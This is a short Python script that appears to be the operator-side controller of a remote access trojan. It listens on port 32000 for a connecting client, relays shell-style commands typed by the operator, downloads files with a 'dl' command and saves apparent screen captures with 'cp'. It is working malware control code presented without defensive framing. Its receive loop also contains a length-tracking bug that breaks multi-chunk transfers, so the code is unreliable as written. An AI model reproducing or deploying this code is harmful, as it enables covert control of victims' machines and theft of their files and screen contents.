import socket


SERVER_IP = ""
SERVER_PORT = 32000
MAX_DATA_SIZE = 1024

def socket_receive_all_data(socket_p, data_len):
    current_data_len = 0
    total_data = None
    print("socket receive all data len: ", data_len)
    while current_data_len < data_len:
        chunk_len = data_len - current_data_len
        if chunk_len > MAX_DATA_SIZE:
            chunk_len = MAX_DATA_SIZE
        data = socket_p.recv(chunk_len)
        print("data len: ", len(data))
        if not data:
            return None
        if not total_data:
            total_data = data
        else:
            total_data += data
        current_data_len = len(data)
        print("total len: ", current_data_len, "/", data_len)
    return total_data

def socket_sent_command_and_receive_all_data(socket_p, command):
    if command == "":
        return None
    socket_p.sendall(command.encode())
    header_data = socket_receive_all_data(socket_p, 13)
    len_data = int(header_data.decode())
    information_received = socket_receive_all_data(socket_p, len_data)
    return information_received

        




s = socket.socket()
s.bind((SERVER_IP,SERVER_PORT))
s.listen()

print("Connecting to the client is now in progress...")
connection_socket, client_address = s.accept()
print(f"The connection with the client {client_address} was made successfully")

dl_filename = None
while True:
    info_data = socket_sent_command_and_receive_all_data(connection_socket, "info")
    if not info_data:
        break
    command = input(client_address[0] + ":" + str(client_address[1]) + " " + info_data.decode() + ">")
    command_split = command.split(" ")
    if len(command_split) == 2 and command_split[0] == "dl":
        dl_filename = command_split[1]
    elif len(command_split) == 2 and command_split[0] == "cp":
        dl_filename = command_split[1] + ".png"

    information_received = socket_sent_command_and_receive_all_data(connection_socket, command)
    if not information_received:
        break
    if dl_filename:
        f = open(dl_filename, "wb")
        f.write(information_received)
        f.close()
        dl_filename = None
    else:
        print(information_received.decode())


s.close()
connection_socket.close()